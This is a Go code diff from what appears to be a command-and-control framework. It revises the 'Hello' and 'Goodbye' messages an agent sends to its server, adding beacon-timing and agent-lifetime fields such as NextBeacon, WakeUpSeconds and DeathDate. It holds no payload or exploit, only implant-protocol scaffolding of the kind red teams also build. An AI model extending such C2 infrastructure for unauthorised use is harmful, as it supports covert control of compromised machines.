@@ -53,15 +53,19 @@ type C2MessageBase struct {
 
 // C2MessageTypeHelloPayload is the payload for the "Hello" message (sent from agent to server).
 type C2MessageTypeHelloPayload struct {
-	IsLive            bool // Indicates if the agent is live.
 	IsPersistent      bool // Indicates if the agent should maintain a persistent connection.
 	BeaconSeconds     int  // Interval (in seconds) for beaconing.
 	MissesBeforeDeath int  // Number of missed beacons before considering the agent dead.
+	WakeUpSeconds     int  // Time until the agent will be awake after a beacon.
+	NextBeacon        int  // Time until the next beacon should be sent.
+	DeathDate         int  // Time until the agent should be considered dead.
 }
 
 // C2MessageTypeGoodbyePayload is the payload for the "Goodbye" message (sent from agent to server).
 type C2MessageTypeGoodbyePayload struct {
-	NextBeaconSeconds int // Time until the next beacon should be sent.
+	MissesBeforeDeath int // Number of missed beacons before considering the agent dead.
+	NextBeacon        int // Time until the next beacon should be sent.
+	DeathDate         int // Time until the agent should be considered dead.
 }
 
 // C2MessageTypeKillPayload is the payload for "Kill" and "Kill Response" messages.
@@ -128,20 +132,24 @@ func BuildMessage(messageType C2MessageType, agentID string, payload json.RawMes
 //////////////////////////
 
 // BuildHelloMessage creates a "Hello" message with the provided parameters.
-func BuildHelloMessage(agentID string, isLive bool, isPersistent bool, beaconSeconds int, missesBeforeDeath int) C2MessageBase {
+func BuildHelloMessage(agentID string, isPersistent bool, beaconSeconds int, missesBeforeDeath int, deathDate int, wakeUpSeconds int, nextBeacon int) C2MessageBase {
 	payload := C2MessageTypeHelloPayload{
-		IsLive:            isLive,
 		IsPersistent:      isPersistent,
 		BeaconSeconds:     beaconSeconds,
 		MissesBeforeDeath: missesBeforeDeath,
+		WakeUpSeconds:     wakeUpSeconds,
+		NextBeacon:        nextBeacon,
+		DeathDate:         deathDate,
 	}
 	return BuildMessage(C2MessageTypeHello, agentID, mustMarshal(payload))
 }
 
 // BuildGoodbyeMessage creates a "Goodbye" message with the given agent ID and beacon interval.
-func BuildGoodbyeMessage(agentID string, nextBeaconSeconds int) C2MessageBase {
+func BuildGoodbyeMessage(agentID string, missesBeforeDeath int, nextBeacon int, deathDate int) C2MessageBase {
 	payload := C2MessageTypeGoodbyePayload{
-		NextBeaconSeconds: nextBeaconSeconds,
+		MissesBeforeDeath: missesBeforeDeath,
+		NextBeacon:        nextBeacon,
+		DeathDate:         deathDate,
 	}
 	return BuildMessage(C2MessageTypeGoodbye, agentID, mustMarshal(payload))
 }
